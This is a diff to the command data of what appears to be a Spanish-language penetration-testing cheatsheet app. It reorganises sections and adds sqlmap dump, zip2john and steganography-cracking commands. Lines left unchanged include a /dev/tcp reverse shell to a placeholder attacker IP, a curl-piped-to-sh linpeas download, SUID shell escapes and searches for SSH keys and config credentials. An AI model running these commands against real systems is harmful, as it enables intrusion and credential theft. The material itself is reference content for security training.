@@ -3,7 +3,7 @@
  */
 export const cheatsheetSections = [
   { id: 'reconocimiento', titleKey: 'cheatsheet_section_recon' },
-  { id: 'ataques-fuerza-bruta', titleKey: 'cheatsheet_section_brute_force' },
+  { id: 'explotacion', titleKey: 'cheatsheet_section_explotacion' },
   { id: 'post-explotacion', titleKey: 'cheatsheet_section_post_explotacion' },
   { id: 'manejo-acceso', titleKey: 'cheatsheet_section_manejo_acceso' },
   { id: 'escalada', titleKey: 'cheatsheet_section_escalada' },
@@ -86,10 +86,10 @@ export const cheatsheetTools = {
       {
         titleKey: 'cheatsheet_ffuf_cat1_title',
         commands: [
-          { descKey: 'cheatsheet_ffuf_cat1_cmd1', cmd: 'ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "[target_url]" -H "Host: FUZZ.[target_domain]"' },
-          { descKey: 'cheatsheet_ffuf_cat1_cmd2', cmd: 'ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -u "[target_url]" -d "username=FUZZ&password=password123" -H "Content-Type: application/x-www-form-urlencoded"' },
-          { descKey: 'cheatsheet_ffuf_cat1_cmd3', cmd: 'ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [target_url]/FUZZ' },
-          { descKey: 'cheatsheet_ffuf_cat1_cmd4', cmd: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u [target_url]/index.php?FUZZ=whoami' },
+          { descKey: 'cheatsheet_ffuf_cat1_cmd1', cmd: "ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u '[target_url]' -H 'Host: FUZZ.[target_domain]'" },
+          { descKey: 'cheatsheet_ffuf_cat1_cmd2', cmd: "ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -u '[target_url]' -d 'username=FUZZ&password=password123' -H 'Content-Type: application/x-www-form-urlencoded'" },
+          { descKey: 'cheatsheet_ffuf_cat1_cmd3', cmd: "ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u '[target_url]/FUZZ'" },
+          { descKey: 'cheatsheet_ffuf_cat1_cmd4', cmd: "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u '[target_url]/index.php?FUZZ=whoami'" },
         ],
       },
       {
@@ -150,7 +150,7 @@ export const cheatsheetTools = {
   // ========== POST-EXPLOTACIÓN ==========
   hydra: {
     id: 'hydra',
-    sectionId: 'ataques-fuerza-bruta',
+    sectionId: 'explotacion',
     name: 'Hydra',
     descKey: 'cheatsheet_hydra_desc',
     categories: [
@@ -164,7 +164,7 @@ export const cheatsheetTools = {
   },
   john: {
     id: 'john',
-    sectionId: 'ataques-fuerza-bruta',
+    sectionId: 'explotacion',
     name: 'John the Ripper',
     descKey: 'cheatsheet_john_desc',
     categories: [
@@ -173,6 +173,7 @@ export const cheatsheetTools = {
         commands: [
           { descKey: 'cheatsheet_john_crack', cmd: 'john -w:/usr/share/wordlists/rockyou.txt hash' },
           { descKey: 'cheatsheet_john_show', cmd: 'john --show hash' },
+          { descKey: 'cheatsheet_john_zip2john', cmd: 'zip2john archive.zip > archive.hash' },
         ],
       },
     ],
@@ -298,7 +299,6 @@ export const cheatsheetTools = {
           { descKey: 'cheatsheet_escalada_nc_victim', cmd: 'cat < /dev/tcp/[attacker_ip]/[attacker_port] | sh' },
           { descKey: 'cheatsheet_escalada_linpeas', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
           { descKey: 'cheatsheet_escalada_winpeas', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS' },
-          { descKey: 'cheatsheet_escalada_enum', cmd: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'' },
         ],
       },
       {
@@ -312,9 +312,9 @@ export const cheatsheetTools = {
         commands: [
           { descKey: 'cheatsheet_escalada_suid_find', cmd: 'find / -perm -4000 2>/dev/null' },
           { descKey: 'cheatsheet_escalada_suid_find_specific', cmd: 'find / -perm -u=s -type f 2>/dev/null' },
-          { descKey: 'cheatsheet_escalada_suid_nmap', cmd: 'nmap --interactive' },
           { descKey: 'cheatsheet_escalada_suid_find_shell', cmd: 'find /etc/passwd -exec /bin/sh \;' },
           { descKey: 'cheatsheet_escalada_find_file_type', cmd: 'find / -name "*.txt" -type f 2>/dev/null' },
+          { descKey: 'cheatsheet_escalada_suid_nmap', cmd: 'nmap --interactive' },
         ],
       },
       {
@@ -385,6 +385,46 @@ export const cheatsheetTools = {
           { descKey: 'cheatsheet_escalada_passwd_history', cmd: 'cat ~/.bash_history' },
           { descKey: 'cheatsheet_escalada_passwd_mysql', cmd: 'cat /etc/mysql/my.cnf' },
           { descKey: 'cheatsheet_escalada_passwd_ssh', cmd: 'find / -name "id_rsa*" 2>/dev/null' },
+        ],
+      },
+    ],
+  },
+
+  // ========== SQLMAP ==========
+  sqlmap: {
+    id: 'sqlmap',
+    sectionId: 'explotacion',
+    nameKey: 'cheatsheet_sqlmap_name',
+    descKey: 'cheatsheet_sqlmap_desc',
+    categories: [
+      {
+        titleKey: 'cheatsheet_sqlmap_title',
+        commands: [
+          { descKey: 'cheatsheet_sqlmap_basic', cmd: 'sqlmap -u "http://target.com/page.php?id=1" --batch' },
+          { descKey: 'cheatsheet_sqlmap_request', cmd: 'sqlmap -r request.txt --batch' },
+          { descKey: 'cheatsheet_sqlmap_dbs', cmd: 'sqlmap -u "http://target.com/page.php?id=1" --dbs --batch' },
+          { descKey: 'cheatsheet_sqlmap_tables', cmd: 'sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables --batch' },
+          { descKey: 'cheatsheet_sqlmap_columns', cmd: 'sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns --batch' },
+          { descKey: 'cheatsheet_sqlmap_dump', cmd: 'sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump --batch' },
+        ],
+      },
+    ],
+  },
+
+  // ========== ESTEGANOGRAFÍA ==========
+  esteganografia: {
+    id: 'esteganografia',
+    sectionId: 'explotacion',
+    nameKey: 'cheatsheet_esteganografia_name',
+    descKey: 'cheatsheet_esteganografia_desc',
+    categories: [
+      {
+        titleKey: 'cheatsheet_esteganografia_title',
+        commands: [
+          { descKey: 'cheatsheet_esteganografia_steghide_extract', cmd: 'steghide extract -sf image.jpg' },
+          { descKey: 'cheatsheet_esteganografia_steghide_info', cmd: 'steghide info image.jpg' },
+          { descKey: 'cheatsheet_esteganografia_steghide_embed', cmd: 'steghide embed -cf image.jpg -ef secret.txt -sf output.jpg' },
+          { descKey: 'cheatsheet_esteganografia_stegseek_crack', cmd: 'stegseek image.jpg /usr/share/wordlists/rockyou.txt' },
         ],
       },
     ],
